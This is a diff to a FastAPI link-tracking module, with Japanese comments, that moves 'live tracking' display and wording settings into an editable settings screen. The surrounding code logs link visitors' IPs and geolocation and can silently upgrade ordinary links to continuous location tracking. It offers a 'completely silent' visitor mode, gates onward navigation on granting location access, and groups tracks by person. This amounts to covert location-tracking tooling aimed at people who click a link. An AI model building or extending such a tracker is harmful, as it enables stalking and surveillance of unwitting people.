@@ -10,11 +10,12 @@ main.py の snsx と同じ場所で include する:
 from __future__ import annotations
 
 import os, re, json, random, string, datetime as dt
+from urllib.parse import quote
 
 from fastapi import APIRouter, Request, Depends, Form, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse
 
-from . import users, persist, linktrack, tenancy
+from . import users, persist, linktrack, tenancy, config as _config
 from .tenancy import db
 
 router = APIRouter()
@@ -23,27 +24,77 @@ LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
 TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
 LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
 
-# 旧版では「リアルタイム追跡」を選んでも page として保存されていた。その救済。
-PROMOTE_PAGE = os.getenv("PROMOTE_PAGE_TO_LIVE", "1") != "0"
+# ---------- 設定（画面 > 環境変数 > 既定） ----------
 
-# 来訪者側の表示: ""=自動(飛び先ありで ask / なしで none) / none / ask / map / full
-LIVE_UI = (os.getenv("LIVE_UI", "") or "").strip().lower()
-if LIVE_UI not in ("none", "ask", "map", "full"):
-    LIVE_UI = ""
+LIVE_DEFAULTS = {
+    "ui": "",                       # ""=自動(none/ask) / none / ask / map / full
+    "ask_text": "位置情報の使用を許可してください",
+    "wait_text": "位置情報を取得しています…",
+    "ok_text": "取得しました。移動します…",
+    "deny_text": "位置情報が許可されていません。許可すると先へ進めます",
+    "retry_text": "もう一度",
+    "go_text": "続ける",
+    "wait_sec": 15.0,               # 未取得のまま何秒で「未許可」表示にするか
+    "dest_min": 2.0,                # 取得後、遷移するまで（秒）
+    "deny_redirect": False,         # 未許可でも遷移するか
+    "dest_redirect": True,          # 取得成功で自動遷移するか
+    "promote_page": True,           # 旧 page リンクを live に昇格させる
+}
 
-# 文言（すべて差し替え可能）
-ASK_TEXT   = os.getenv("LIVE_ASK_TEXT",   "位置情報の使用を許可してください")
-WAIT_TEXT  = os.getenv("LIVE_WAIT_TEXT",  "位置情報を取得しています…")
-OK_TEXT    = os.getenv("LIVE_OK_TEXT",    "取得しました。移動します…")
-DENY_TEXT  = os.getenv("LIVE_DENY_TEXT",  "位置情報が許可されていません。許可すると先へ進めます")
-RETRY_TEXT = os.getenv("LIVE_RETRY_TEXT", "もう一度")
-GO_TEXT    = os.getenv("LIVE_GO_TEXT",    "続ける")
+ENV_MAP = {
+    "ui": "LIVE_UI", "ask_text": "LIVE_ASK_TEXT", "wait_text": "LIVE_WAIT_TEXT",
+    "ok_text": "LIVE_OK_TEXT", "deny_text": "LIVE_DENY_TEXT",
+    "retry_text": "LIVE_RETRY_TEXT", "go_text": "LIVE_GO_TEXT",
+    "wait_sec": "LIVE_WAIT", "dest_min": "LIVE_DEST_MIN",
+    "deny_redirect": "LIVE_DENY_REDIRECT", "dest_redirect": "LIVE_DEST_REDIRECT",
+    "promote_page": "PROMOTE_PAGE_TO_LIVE",
+}
 
-# 遷移の制御
-DEST_REDIRECT = os.getenv("LIVE_DEST_REDIRECT", "1") != "0"  # 取得成功で自動遷移するか
-DENY_REDIRECT = os.getenv("LIVE_DENY_REDIRECT", "0") != "0"  # 未許可でも遷移するか（既定=しない）
-WAIT_SEC = float(os.getenv("LIVE_WAIT", "15"))               # 未取得のまま何秒で「未許可」表示にするか
-DEST_MIN = float(os.getenv("LIVE_DEST_MIN", "2"))            # 取得後、遷移するまで（秒）
+UI_CHOICES = ("", "none", "ask", "map", "full")
+UI_LABEL = {"": "自動（飛び先があれば「許可を求める」／なければ無言）",
+            "none": "完全に無言（何も表示しない）",
+            "ask": "許可を求める1行だけ",
+            "map": "地図だけ",
+            "full": "全部（状態・地図・ボタン）"}
+
+
+def _coerce(key, v):
+    d = LIVE_DEFAULTS[key]
+    if isinstance(d, bool):
+        if isinstance(v, bool):
+            return v
+        return str(v).strip().lower() not in ("0", "false", "off", "no", "")
+    if isinstance(d, float):
+        try:
+            return float(v)
+        except (TypeError, ValueError):
+            return d
+    return str(v)
+
+
+def live_cfg():
+    """実効設定。画面で保存した値 > 環境変数 > 既定値。"""
+    out = dict(LIVE_DEFAULTS)
+    for k, env in ENV_MAP.items():
+        v = os.getenv(env)
+        if v is None or v == "":
+            continue
+        out[k] = _coerce(k, v)
+    try:
+        sec = _config.get().get("live") or {}
+    except Exception:
+        sec = {}
+    if isinstance(sec, dict):
+        for k in LIVE_DEFAULTS:
+            v = sec.get(k)
+            if v is None or v == "":
+                continue
+            out[k] = _coerce(k, v)
+    if out["ui"] not in UI_CHOICES:
+        out["ui"] = ""
+    out["wait_sec"] = max(3.0, min(float(out["wait_sec"]), 120.0))
+    out["dest_min"] = max(0.5, min(float(out["dest_min"]), 30.0))
+    return out
 
 
 def _m():
@@ -68,7 +119,6 @@ def _now():
 
 
 def _bind_owner(code):
-    """code から所有者を引き、テナント文脈を張る。"""
     owner = users.owner_of_link(code)
     if not owner:
         return None
@@ -133,7 +183,7 @@ def _get_track(code):
     if link:
         return link
     l = db.link_get(code)
-    if l and (l["mode"] or "page") == "page" and PROMOTE_PAGE:
+    if l and (l["mode"] or "page") == "page" and live_cfg()["promote_page"]:
         db.track_update(code, mode="live", interval=_clamp_iv(l["interval"]))
         return db.track_get(code)
     return l
@@ -178,16 +228,18 @@ def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
 
 
 def _live_page(request, code, hid, link, nonce):
+    L = live_cfg()
     dest = _abs_dest(link["dest"])
-    ui = LIVE_UI or ("ask" if dest else "none")
+    ui = L["ui"] or ("ask" if dest else "none")
     return render("link_live.html", request, code=code, hit_id=hid, link=link,
                   dest=dest, nonce=nonce,
                   iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN,
-                  ui=ui, ask_text=ASK_TEXT, ok_text=OK_TEXT, deny_text=DENY_TEXT,
-                  wait_sec=WAIT_SEC,
-                  dest_redirect=(DEST_REDIRECT and bool(dest)),
-                  deny_redirect=(DENY_REDIRECT and bool(dest)),
-                  dest_min=DEST_MIN)
+                  ui=ui, ask_text=L["ask_text"], ok_text=L["ok_text"],
+                  deny_text=L["deny_text"], wait_text=L["wait_text"],
+                  wait_sec=L["wait_sec"],
+                  dest_redirect=(L["dest_redirect"] and bool(dest)),
+                  deny_redirect=(L["deny_redirect"] and bool(dest)),
+                  dest_min=L["dest_min"])
 
 
 # ================= 公開ルート（/l/ 配下を引き継ぐ） =================
@@ -199,6 +251,7 @@ def link_hit(code: str, request: Request):
     link = db.link_get(code)
     if not link or not link["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
+    L = live_cfg()
     hid = _record_hit(request, code)
     hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
     nonce = (hrow["nonce"] if hrow else "") or ""
@@ -222,7 +275,7 @@ def link_hit(code: str, request: Request):
                       g=linktrack.geo(ip))
 
     # 連続追跡モード（page として保存されたリンクは初回に live へ昇格）
-    if mode == "live" or (mode == "page" and PROMOTE_PAGE):
+    if mode == "live" or (mode == "page" and L["promote_page"]):
         if mode != "live":
             db.track_update(code, mode="live", interval=_clamp_iv(link["interval"]))
             link = db.link_get(code) or link
@@ -231,9 +284,9 @@ def link_hit(code: str, request: Request):
     # 一瞬 / geo 用ランディング
     return render("link_land.html", request, code=code, hit_id=hid, link=link,
                   dest=link["dest"] or "", nonce=nonce,
-                  go_text=GO_TEXT, wait_text=WAIT_TEXT, ok_text=OK_TEXT,
-                  deny_text=DENY_TEXT, retry_text=RETRY_TEXT,
-                  deny_redirect=DENY_REDIRECT, dest_min=DEST_MIN)
+                  go_text=L["go_text"], wait_text=L["wait_text"], ok_text=L["ok_text"],
+                  deny_text=L["deny_text"], retry_text=L["retry_text"],
+                  deny_redirect=L["deny_redirect"], dest_min=L["dest_min"])
 
 
 @router.post("/l/{code}/x")
@@ -406,6 +459,72 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
     }
 
 
+# ================= 表示・文言の設定画面 =================
+
+@router.get("/livetrack", response_class=HTMLResponse)
+def live_settings_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
+    L = live_cfg()
+    saved = {}
+    try:
+        saved = _config.get().get("live") or {}
+    except Exception:
+        saved = {}
+    env_over = {k: os.getenv(e) for k, e in ENV_MAP.items() if os.getenv(e)}
+    return render("live_settings.html", request, L=L, saved=saved, env_over=env_over,
+                  ui_choices=UI_CHOICES, ui_label=UI_LABEL,
+                  base=_m()._base(request), msg=msg, err=err)
+
+
+@router.post("/livetrack")
+async def live_settings_save(request: Request, u=Depends(auth)):
+    form = await request.form()
+
+    def s(k, d=""):
+        return str(form.get(k) if form.get(k) is not None else d).strip()
+
+    def num(k, d):
+        try:
+            return float(s(k, str(d)) or d)
+        except Exception:
+            return float(d)
+
+    def flag(k):
+        return form.get(k) not in (None, "", "0", "off", "false")
+
+    data = {
+        "ui": s("ui"),
+        "ask_text": s("ask_text")[:120],
+        "wait_text": s("wait_text")[:120],
+        "ok_text": s("ok_text")[:120],
+        "deny_text": s("deny_text")[:200],
+        "retry_text": s("retry_text")[:40],
+        "go_text": s("go_text")[:40],
+        "wait_sec": max(3.0, min(num("wait_sec", 15), 120.0)),
+        "dest_min": max(0.5, min(num("dest_min", 2), 30.0)),
+        "deny_redirect": flag("deny_redirect"),
+        "dest_redirect": flag("dest_redirect"),
+        "promote_page": flag("promote_page"),
+    }
+    if data["ui"] not in UI_CHOICES:
+        data["ui"] = ""
+    _config.save_sections({"live": data})
+    try:
+        persist.push_user(u, force=True)
+    except Exception:
+        pass
+    return RedirectResponse("/livetrack?msg=" + quote("保存しました"), 303)
+
+
+@router.post("/livetrack/reset")
+def live_settings_reset(u=Depends(auth)):
+    _config.save_sections({"live": dict(LIVE_DEFAULTS)})
+    try:
+        persist.push_user(u, force=True)
+    except Exception:
+        pass
+    return RedirectResponse("/livetrack?msg=" + quote("既定に戻しました"), 303)
+
+
 # ================= 追跡の管理画面 =================
 
 @router.get("/tracks", response_class=HTMLResponse)
@@ -420,7 +539,7 @@ def tracks_page(request: Request, u=Depends(auth)):
     for r in rows:
         groups.setdefault(r.get("person") or r["name"] or "名無し", []).append(r)
     return render("tracks.html", request, rows=rows, groups=groups,
-                  base=_m()._base(request))
+                  base=_m()._base(request), L=live_cfg())
 
 
 @router.post("/tracks/add")
